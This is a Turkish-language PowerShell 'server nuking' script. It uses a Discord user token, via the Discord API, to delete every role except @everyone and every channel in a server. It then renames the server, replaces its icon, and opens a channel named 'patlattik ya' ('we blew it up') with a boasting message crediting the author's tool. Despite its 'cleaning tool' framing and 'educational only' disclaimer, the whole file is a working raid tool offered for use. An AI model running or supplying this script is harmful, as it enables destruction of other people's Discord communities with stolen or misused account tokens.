# Gelismis Discord Sunucu Temizleme ve Yenileme Araci
# Bu script kullanici tokenini kullanarak bir Discord sunucusundaki tum rolleri ve kanallari siler
# Ardindan Sunucu adini ve resmini degistirir, "Duzeltiyoruz." isimli bir kanal acip bilgilendirme mesaji gonderir
# NOT: Kullanici tokeni kullanmak Discord'un Hizmet Sartlari'na aykiridir ve hesabinizin kapatilmasina neden olabilir.

Write-Host "Discord Sunucu Patlatma Araci" -ForegroundColor Cyan
Write-Host "k3d1c1k Tarafindan Yazilmistir. Yayinlanmasi Ve Paylasilmasi Yasaktir" -ForegroundColor Red
Write-Host "discord.gg/shurima" -ForegroundColor Red
Write-Host "==============================" -ForegroundColor Cyan
Write-Host "UYARI: Kullanici tokeni kullanmak Discord Hizmet Sartlari'na aykiridir!" -ForegroundColor Red
Write-Host "Bu script sadece egitim amaclidir ve hesabinizin kapatilmasina neden olabilir." -ForegroundColor Red
Write-Host "==============================" -ForegroundColor Cyan

# Kullanici tokenini ve Sunucu ID'sini alma
$token = Read-Host -Prompt "Discord Kullanici Tokeninizi girin"
$guildId = Read-Host -Prompt "Islem yapmak istediginiz Sunucu ID'sini girin"

# Sunucu adi ve resmi icin bilgileri alma
$newServerName = Read-Host -Prompt "Sunucu icin yeni bir isim girin"
$serverIconUrl = Read-Host -Prompt "Sunucu ikonu icin bir resim URL'si girin (bos birakabilirsiniz)"

# Onay alma
$confirmation = Read-Host -Prompt "Bu islem Sunucudaki TUM ROLLERI VE KANALLARI SILECEK, Sunucu adini ve resmini degistirecektir! Devam etmek istediginizden emin misiniz? (E/H)"
if ($confirmation -ne "E" -and $confirmation -ne "e") {
    Write-Host "Islem iptal edildi." -ForegroundColor Yellow
    exit
}

# API istekleri icin basliklari olusturma
$headers = @{
    "Authorization" = $token
    "Content-Type" = "application/json"
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
}

#region Rol Islemleri

# Sunucudaki tum rolleri alma fonksiyonu
function Get-DiscordRoles {
    $url = "https://discord.com/api/v9/guilds/$guildId/roles"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction Stop
        return $response
    }
    catch {
        Write-Host "Roller alinamadi! Hata: $_" -ForegroundColor Red
        return $null
    }
}

# Rol silme fonksiyonu
function Remove-DiscordRole {
    param (
        [Parameter(Mandatory = $true)]
        [string]$RoleId,
        
        [Parameter(Mandatory = $true)]
        [string]$RoleName
    )
    
    $url = "https://discord.com/api/v9/guilds/$guildId/roles/$RoleId"
    
    try {
        Invoke-RestMethod -Uri $url -Headers $headers -Method Delete -ErrorAction Stop
        Write-Host "Rol basariyla silindi: $RoleName" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Rol silinirken hata olustu: $RoleName - Hata: $_" -ForegroundColor Red
        return $false
    }
}

# Rol silme islemi
function Start-RoleDeletion {
    Write-Host "`n==== ROL SILME ISLEMI BASLATILIYOR ====" -ForegroundColor Yellow
    Write-Host "Sunucudaki roller aliniyor..." -ForegroundColor Yellow
    $roles = Get-DiscordRoles
    
    if ($null -eq $roles -or $roles.Count -eq 0) {
        Write-Host "Roller alinamadi veya hic rol bulunamadi." -ForegroundColor Red
        return
    }
    
    Write-Host "Toplam $($roles.Count) rol bulundu." -ForegroundColor Cyan
    
    # Rolleri pozisyonlarina gore sirala (yuksekten dusuge)
    $sortedRoles = $roles | Sort-Object -Property position -Descending
    
    $deletedCount = 0
    $failedCount = 0
    
    foreach ($role in $sortedRoles) {
        # @everyone rolunu atla
        if ($role.name -eq "@everyone") {
            Write-Host "@everyone rolu atlaniyor (ID: $($role.id))." -ForegroundColor Yellow
            continue
        }
        
        Write-Host "Rol siliniyor: $($role.name) (ID: $($role.id))..." -ForegroundColor Yellow
        
        $result = Remove-DiscordRole -RoleId $role.id -RoleName $role.name
        
        if ($result) {
            $deletedCount++
        }
        else {
            $failedCount++
        }
        
        # Discord API hiz sinirlamalarini asmamak icin bekleme
        Start-Sleep -Milliseconds 800
    }
    
    Write-Host "`n--- ROL SILME SONUCU ---" -ForegroundColor Cyan
    Write-Host "Toplam roller: $($roles.Count)" -ForegroundColor White
    Write-Host "Silinen roller: $deletedCount" -ForegroundColor Green
    Write-Host "Silinemeyen roller: $failedCount" -ForegroundColor Red
}

#endregion

#region Kanal Islemleri

# Sunucudaki tum kanallari alma fonksiyonu
function Get-DiscordChannels {
    $url = "https://discord.com/api/v9/guilds/$guildId/channels"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Get -ErrorAction Stop
        return $response
    }
    catch {
        Write-Host "Kanallar alinamadi! Hata: $_" -ForegroundColor Red
        return $null
    }
}

# Kanal silme fonksiyonu
function Remove-DiscordChannel {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ChannelId,
        
        [Parameter(Mandatory = $true)]
        [string]$ChannelName
    )
    
    $url = "https://discord.com/api/v9/channels/$ChannelId"
    
    try {
        Invoke-RestMethod -Uri $url -Headers $headers -Method Delete -ErrorAction Stop
        Write-Host "Kanal basariyla silindi: $ChannelName" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Kanal silinirken hata olustu: $ChannelName - Hata: $_" -ForegroundColor Red
        return $false
    }
}

# Kanal silme islemi
function Start-ChannelDeletion {
    Write-Host "`n==== KANAL SILME ISLEMI BASLATILIYOR ====" -ForegroundColor Yellow
    Write-Host "SunucuSunucudaki kanallar aliniyor..." -ForegroundColor Yellow
    $channels = Get-DiscordChannels
    
    if ($null -eq $channels -or $channels.Count -eq 0) {
        Write-Host "Kanallar alinamadi veya hic kanal bulunamadi." -ForegroundColor Red
        return
    }
    
    Write-Host "Toplam $($channels.Count) kanal bulundu." -ForegroundColor Cyan
    
    # Once kategorileri degil, alt kanallari silme
    $nonCategoryChannels = $channels | Where-Object { $_.type -ne 4 }
    $categoryChannels = $channels | Where-Object { $_.type -eq 4 }
    
    $deletedCount = 0
    $failedCount = 0
    
    # Once normal kanallari sil
    foreach ($channel in $nonCategoryChannels) {
        Write-Host "Kanal siliniyor: $($channel.name) (ID: $($channel.id))..." -ForegroundColor Yellow
        
        $result = Remove-DiscordChannel -ChannelId $channel.id -ChannelName $channel.name
        
        if ($result) {
            $deletedCount++
        }
        else {
            $failedCount++
        }
        
        # Discord API hiz sinirlamalarini asmamak icin bekleme
        Start-Sleep -Milliseconds 800
    }
    
    # Sonra kategorileri sil
    foreach ($channel in $categoryChannels) {
        Write-Host "Kategori siliniyor: $($channel.name) (ID: $($channel.id))..." -ForegroundColor Yellow
        
        $result = Remove-DiscordChannel -ChannelId $channel.id -ChannelName $channel.name
        
        if ($result) {
            $deletedCount++
        }
        else {
            $failedCount++
        }
        
        # Discord API hiz sinirlamalarini asmamak icin bekleme
        Start-Sleep -Milliseconds 800
    }
    
    Write-Host "`n--- KANAL SILME SONUCU ---" -ForegroundColor Cyan
    Write-Host "Toplam kanallar: $($channels.Count)" -ForegroundColor White
    Write-Host "Silinen kanallar: $deletedCount" -ForegroundColor Green
    Write-Host "Silinemeyen kanallar: $failedCount" -ForegroundColor Red
    
    return $deletedCount -eq $channels.Count
}

#endregion

#region Sunucu Guncelleme Islemleri

# Resim URL'sinden Base64'e donusturme fonksiyonu
function Convert-ImageUrlToBase64 {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ImageUrl
    )
    
    try {
        # Resmi indir
        $webClient = New-Object System.Net.WebClient
        $imageBytes = $webClient.DownloadData($ImageUrl)
        
        # Base64'e donustur
        $base64String = [System.Convert]::ToBase64String($imageBytes)
        $dataUri = "data:image/png;base64," + $base64String
        
        return $dataUri
    }
    catch {
        Write-Host "Resim donusturulurken hata olustu: $_" -ForegroundColor Red
        return $null
    }
}

# Sunucu adini ve resmini degistirme fonksiyonu
function Update-DiscordServer {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ServerName,
        
        [Parameter(Mandatory = $false)]
        [string]$IconUrl = ""
    )
    
    Write-Host "`n==== SUNUCU BILGILERI GUNCELLEME ISLEMI BASLATILIYOR ====" -ForegroundColor Yellow
    
    $url = "https://discord.com/api/v9/guilds/$guildId"
    
    $bodyObj = @{
        name = $ServerName
    }
    
    # Eger ikon URL'si verildiyse, isle
    if (-not [string]::IsNullOrEmpty($IconUrl)) {
        Write-Host "Sunucu ikonu indiriliyor ve isleniyor..." -ForegroundColor Yellow
        $iconData = Convert-ImageUrlToBase64 -ImageUrl $IconUrl
        
        if ($iconData) {
            $bodyObj.icon = $iconData
            Write-Host "Ikon basariyla hazirlandi." -ForegroundColor Green
        }
        else {
            Write-Host "Ikon hazirlanamadi, Sunucu ikonu degistirilmeyecek." -ForegroundColor Red
        }
    }
    
    $body = $bodyObj | ConvertTo-Json
    
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method PATCH -Body $body -ErrorAction Stop
        Write-Host "Sunucu bilgileri basariyla guncellendi!" -ForegroundColor Green
        Write-Host "Yeni Sunucu adi: $($response.name)" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Sunucu bilgileri guncellenirken hata olustu: $_" -ForegroundColor Red
        return $false
    }
}

#endregion

#region Bilgilendirme Islemleri

# Yeni metin kanali olusturma fonksiyonu
function New-DiscordTextChannel {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ChannelName
    )
    
    $url = "https://discord.com/api/v9/guilds/$guildId/channels"
    
    $body = @{
        name = $ChannelName
        type = 0  # 0 = Metin Kanali
    } | ConvertTo-Json
    
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Post -Body $body -ErrorAction Stop
        Write-Host "Yeni kanal basariyla olusturuldu: $ChannelName (ID: $($response.id))" -ForegroundColor Green
        return $response
    }
    catch {
        Write-Host "Kanal olusturulurken hata olustu: $ChannelName - Hata: $_" -ForegroundColor Red
        return $null
    }
}

# Kanala mesaj gonderme fonksiyonu
function Send-DiscordMessage {
    param (
        [Parameter(Mandatory = $true)]
        [string]$ChannelId,
        
        [Parameter(Mandatory = $true)]
        [string]$Message
    )
    
    $url = "https://discord.com/api/v9/channels/$ChannelId/messages"
    
    $body = @{
        content = $Message
    } | ConvertTo-Json
    
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -Method Post -Body $body -ErrorAction Stop
        Write-Host "Mesaj basariyla gonderildi!" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "Mesaj gonderilirken hata olustu: Hata: $_" -ForegroundColor Red
        return $false
    }
}

# Bilgilendirme kanali olusturma ve mesaj gonderme
function Start-InformationProcess {
    Write-Host "`n==== BILGILENDIRME ISLEMI BASLATILIYOR ====" -ForegroundColor Yellow
    
    # Yeni bir metin kanali olustur
    $newChannel = New-DiscordTextChannel -ChannelName "patlattik ya"
    
    if ($null -eq $newChannel) {
        Write-Host "Bilgilendirme kanali olusturulamadi!" -ForegroundColor Red
        return $false
    }
    
    # Kisa bir bekleme
    Start-Sleep -Seconds 1
    
    # Kanala bilgilendirme mesaji gonder
    $message = "Bu Sunucu Patlatilmistir. Valla Kim Patlatti bilmem ama. Patlatan Kisi k3d1c1k'in Tool'unu kullanmis O kesin."
    $result = Send-DiscordMessage -ChannelId $newChannel.id -Message $message
    
    return $result
}

#endregion

# Ana islem
function Start-DiscordServerCleaning {
    # Once rolleri sil
    Start-RoleDeletion
    
    # Sonra kanallari sil
    Start-ChannelDeletion
    
    # Sunucu adini ve resmini degistir
    Update-DiscordServer -ServerName $newServerName -IconUrl $serverIconUrl
    
    # Son olarak bilgilendirme kanali olustur ve mesaj gonder
    Start-InformationProcess
    
    Write-Host "`n==== ISLEM TAMAMLANDI ====" -ForegroundColor Cyan
}

# Islemi baslat
Start-DiscordServerCleaning
Write-Host "`nSunucu temizleme ve yenileme islemi tamamlandi." -ForegroundColor Cyan
Write-Host "Cikmak icin herhangi bir tusa basin..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")